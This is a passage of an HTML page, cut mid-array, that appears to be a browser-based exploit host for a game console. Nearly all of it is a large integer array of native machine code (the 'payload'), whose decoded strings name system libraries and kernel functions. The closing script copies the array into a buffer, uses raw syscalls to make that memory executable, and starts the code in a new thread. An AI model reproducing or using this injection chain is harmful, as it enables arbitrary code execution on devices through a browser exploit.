05,361580767,4588,3375729992,3892314125,4294966702,2370363273,1187605,898451456,3516,4294810088,1222609407,309466509,2370306048,896565,4253345792,3750363135,1695911240,1207959570,228668813,1877475328,2315255805,361580767,4520,2335542600,3892314125,4294966618,2370363273,1227541,898451456,3453,4294788584,1222609407,313922957,2370306048,880693,4247840768,3750363135,3105197384,1207959569,224408973,468189184,2315255805,361580767,4348,1396018504,3892314125,4294966534,2370363273,1132309,898451456,3399,4294767080,1222609407,297932173,2370306048,867637,4242335744,3750363135,2232782152,1207959569,221197709,3353870336,2315255804,361580767,4568,540380488,3892314125,4294966450,2370363273,1125141,898451456,3340,4294745576,1222609407,276174221,2370306048,850997,4236830720,3750363135,2031455560,1207959569,217003405,1944584192,2315255804,361580767,4292,3560279368,3892314124,4294966366,2370363273,1158933,898451456,3271,4294724072,1222609407,292165005,2370306048,830261,4231325696,3750363135,2903870792,1207959569,212153741,535298048,2315255804,361580767,4440,2536869192,3892314124,4294966282,2370363273,1114901,898451456,3211,4294702568,1222609407,290329997,2370306048,819253,4225820672,3750363135,1226149192,1207959568,209139085,3420979200,2315255803,361580767,4340,1765117256,3892314124,4294966198,2370363273,1038101,898451456,3164,4294681064,1222609407,263329165,2370306048,806709,4220315648,3750363135,622169416,1207959569,205796749,2011693056,2315255803,361580767,3952,926256456,3892314124,4294966114,2370363273,1008405,898451456,3114,4294659560,1222609407,282989965,2370306048,794421,4214810624,3750363135,3105197384,1207959567,202585485,602406912,2315255803,361580767,3900,70618440,3892314124,4294966030,2370363273,1046293,898451456,3067,4294638056,1222609407,264377741,2370306048,781365,4209305600,3750363135,1293258056,1207959568,199046541,3488088064,2315255802,361580767,3888,3476393288,3892314123,4294965946,2370363273,1032981,898451456,3008,4294616552,1222609407,264115597,2370306048,766261,4203800576,3750363135,361580635,3800,2721418568,3909091339,4294965882,633390920,3909091328,980,918603592,3909091328,968,197183304,3909091328,956,288722248,1375731728,1849527624,1207959561,276694471,0,1793589248,2248146938,1210741952,267269517,2370306048,741437,4199802880,3230007295,2370311028,1038133,1032669184,2892,4294589672,3309145087,1207959567,264639885,2370306048,738869,4193314816,1032585215,4012,3977612616,1207959567,188691853,3622305792,2348810233,1020733,361580544,4108,926256456,3892314123,4294965694,259669387,2370306048,1037077,898451456,2854,4294551016,1631423487,1207959567,268047757,2370306048,728117,4186761216,1032585215,3912,152407368,1207959568,186398093,1944584192,2348810233,995133,361580544,3960,557157704,3892314123,4294965594,253115787,2370306048,990997,898451456,2849,4294525416,4248669183,1207959566,260969869,2370306048,730421,4180207616,1032585215,3812,3440741704,1207959567,186267021,266862592,2348810233,969533,361580544,3892,255167816,3892314123,4294965494,246562187,2370306048,998165,898451456,2820,4294499816,2570947583,1207959566,255464845,2370306048,719413,4173654016,1032585215,3712,2702544200,1207959566,183514509,2884108288,2348810232,943933,361580544,3888,3862269256,3892314122,4294965394,240008587,2370306048,931605,898451456,2781,4294474216,893225983,1207959566,249959821,2370306048,711221,4167100416,1032585215,3612,1159040328,1207959566,182007181,1206386688,2348810232,918333,361580544,3684,3610611016,3892314122,4294965294,233454987,2370306048,977685,898451456,2757,4294448616,3510471679,1207959565,237114765,2370306048,702773,4160546816,1032585215,3512,3373632840,1207959565,178795917,3823632384,2348810231,892733,361580544,3704,2520091976,3892314122,4294965194,226901387,2370306048,929557,898451456,2698,4294423016,1832750079,1207959565,239998349,2370306048,690229,4153993216,1032585215,3412,2232782152,1207959565,176502157,2145910784,2348810231,867133,361580544,3596,2184547656,3892314122,4294965094,220347787,2370306048,924437,898451456,2687,4294397416,155028479,1207959565,222434701,2370306048,687157,4147439616,1032585215,3312,3776286024,1207959564,174732685,468189184,2348810231,841533,361580544,3312,1479904584,3892314122,4294964994,213794187,2370306048,896789,898451456,2630,4294371816,2772274175,1207959564,220599693,2370306048,668725,4140886016,1032585215,3212,1159040328,1207959565,170014093,3085434880,2348810230,815933,361580544,3300,898451544,2577,4294352361,3224455423,264931657,3271651845,3426583368,12,4283439220,836373,143218944,4290824008,1224736767,4294951623,801374207,796159597,811758453,1768173103,1936028786,1831796852,1966044270,791765619,1919509550,1953719668,1936019968,1769107316,1713399662,980250482,1414416672,1095651909,1932460108,1702130553,1633967981,1882153332,796289394,796093805,779120737,1650418276,1969972065,1932460144,1702130553,1633967981,1882153332,796289394,796093805,779120737,1918853732,762606437,7037282,1937339183,1601004916,1635017060,1769107503,1835872118,1885417331,1650732656,2037591808,1835365491,1952539743,1919954785,1831827049,1630499693,1868784740,1680766062,1633836898,1886743395,2037591808,1835365491,1952539743,1919954785,1831827049,1630499693,1868784740,1680766062,1701994338,1647146099,788556641,1953724787,1683975525,794915937,1986622064,1936551215,1684300079,1953394531,6448174,1937339183,1601004916,1635017060,1769107503,1835872118,1986080627,1852793695,1953391988,778527327,1650418276,1969972065,1932460144,1702130553,1633967981,1882153332,796289394,796093805,1667200609,1702129263,1650422894,1650732647,1936028255,1633824116,1932460139,1702130553,1633967981,1882153332,796289394,796093805,1667200609,1702129263,1650422894,1650732647,541213696,1953719634,543519343,1886220099,1702126956,1699875374,1953460066,543649385,1936617315,778398831,1375743534,1869902693,1735289202,1869768224,1428175469,3228243,1953393967,1651733807,1111764785,1667318879,795899243,1852649216,1937059700,1143943522,1631870786,1886743395,1886413103,6448174,1953393967,1651733807,1111764785,1667318879,795899243,779120737,1918853732,762606437,7037282,1953393967,1651733807,1111764785,1667318879,795899243,1667523681,779382383,788554340,796159597,828535669,1598178351,1801675076,1630498933,1868784740,1680766062,1701994338,1647146099,788556641,796159597,828535669,1598178351,1801675076,1630498933,1868783478,1852142702,1734500212,6448174,1953393967,1651733807,1111764785,1667318879,795899243,1667200609,1702129263,1650422894,1650732647,1936028255,1633824116,1699872875,1919906931,543649385,1836020326,1398087738,788541506,796159597,811758453,1598178351,1801675076,3108981,1953393967,1651733807,1111764784,1667318879,795899243,779120737,788554340,796159597,811758453,1598178351,1801675076,1630498933,1680765040,1701994338,1647146099,788556641,796159597,811758453,1598178351,1801675076,1630498933,1868784740,1680766062,1831796834,1966044270,791700083,1147093572,1969972065,1684090736,1852793700,1650732660,1936028255,1633824116,1831796843,1966044270,791700083,1147093572,1969972065,1986080624,1852793695,1953391988,778527327,788554340,796159597,811758453,1598178351,1801675076,1630498933,1868783478,1852142702,1734500212,1600283694,1953719666,1801544237,796075264,1711305509,1887007859,1936064613,1752457584,1869768192,1702428781,1634467955,6645618,1952543859,1946182505,2053467497,6647407,1853453153,1734934627,1701998446,7103329,1836214628,7041889,1937339183,795698548,1835888483,1815047791,1815044713,1666409065,1937331045,1818850389,1919972142,1932460152,1702130553,1868771181,1852796269,1651076143,1651076143,1399153491,1702130553,1919243117,1701013878,1919972142,1668481144,1937331045,1818850389,1684956499,1953724755,1867410789,1768319348,1769234787,1767337583,1700030580,1929409656,2035508579,1835365491,1987208531,1281713001,1668183393,1650808680,2003792450,7497075,168456997,168430090,1932460042,1702130553,1868771181,1852796269,1651076143,1651076143,1432707923,1400006003,1769370213,1932420451,7893616,1432707955,1400006003,1769370213,1850303843,1634301033,1702521196,1701016320,1919251285,1987208531,1197826921,1867281509,1433299303,1232233843,1936280676,1668481140,1702057317,1919243122,1701013878,1836213588,1952542313,1668481125,1702057317,1919243122,1701013878,1433691463,1316119923,6647137,1432707955,1400006003,1769370213,1699177827,1768835444,1818323316,1919251285,1701008128,1131641171,1382380143,1869570661,1932460148,1702130553,1868771181,1852796269,1651076143,1651076143,1852990827,1932422245,7893616,1264935795,1701737061,1650807404,7630703,1398958444,2035508579,1685024115,778398837,2020765811,1701016320,1836284243,1819632751,1634684005,1685015908,6646901,1398958444,1766614371,1850303330,1852990836,1932422241,7893616,1819042157,1711301487,6645106,1819042147,1912628079,1819042149,1828741999,1818324325,7235433,1936549229,1828746341,1885564261,1701642361,1886217069,1920234240,7958627,1852994675,7958627,1668445299,1929409633,1668182644,1929409633,1701606004,1953693806,1886217074,1920234240,1886217070,1919972096,1718906473,1886286592,1953393010,1936916582,1718509923,1920234240,7497827,1920103539,7497827,1936880755,1929409140,1969517172,1769078896,2019910766,1685285120,1953064809,1869897984,1953693801,1885564018,1953693817,1920099698,1593864815,1886676295,1887007843,1398734949,1819635572,1868784128,1929410928,1684955506,1668505856,1701669236,1668505856,1701669236,1728082527,1835627629,1835466853,1701669236,1811968863,1818321775,1701669236,1668246528,1769237601,1918854509,1953197312,6647145,1852141679,7498084,1684104562,7498084,1684104562,1601333604,1702101106,1768189036,1702035570,1768188773,1701970034,1684957559,7498084,1936682083,1919509605,1919509504,1728078950,1919972453,1634625391,1711301997,1852141679,1701996032,1711301729,1953067639,1936064613,7038309,1818588262,1667629164,1702063980,1919968768,1718906473,1651076096,1852990827,2002742373,1932419685,7893616,1801611628,1701737061,2037604204,1886596723,1593866354,1635021663,1667197795,1734306664,1685217653,1935630080,1801675124,1802003295,1767990879,1600061548,1869771365,1668481138,1919241061,1164731758,1919906418,1701016320,1852990795,1867279461,1951622241,1299477089,1819632751,1668481125,1919241061,1097622894,1668246636,1147499617,1667592809,1835355508,7959151,1264935795,1701737061,1885425004,1701996868,1699574883,2037542765,1701016320,1852990795,1699179621,1919501428,1299473253,1919905125,2053723001,1668481125,1919241061,1399612782,7627124,1264935795,1701737061,1701859180,1668481134,1919241061,1382835566,6578533,1264935795,1701737061,1702055020,1929407333,1699439971,1818586738,1936682051,1668481125,1919241061,1399612782,1885693292,1701016320,1852990795,1934978149,1885693292,1701016320,1852990795,1699179621,1835627636,1684434789,1929410913,1699439971,1818586738,1349805383,1701015410,1767142259,1929405805,1699439971,1818586738,1131701575,1701999221,1883468910,2037579893,1819566963,1937339136,1651274851,1835101817,2037579877,1668440435,2019885160,1702257509,1752461312,1684104562,1818587999,1953497190,1634038376,1702059876,1717985652,1953066601,1886281593,1701016320,1852990795,1917021285,1702125925,1702195525,1929405813,1699439971,1818586738,1701602628,1900373364,1702192501,1701016320,1852990795,1682009189,1702057316,1702249842,1929409646,1699439971,1818586738,1382310977,1164206437,1953391990,1952802560,6580597,1735681383,1728078953,1768977509,1702035556,1684632948,1952805632,6580583,1920230771,1684632933,1952805632,1768383858,100,0,0,0,0,0,0];
for(var i=0;i<payload.length;i++){payloadbuf.backing[i]=payload[i];} p.syscall(74,payloadbuf,65536,7);p.syscall(324,1);p.fcall(createThread,payloadbuf,0,p.sptr("payload"));done();};
</script>
</body>
</html>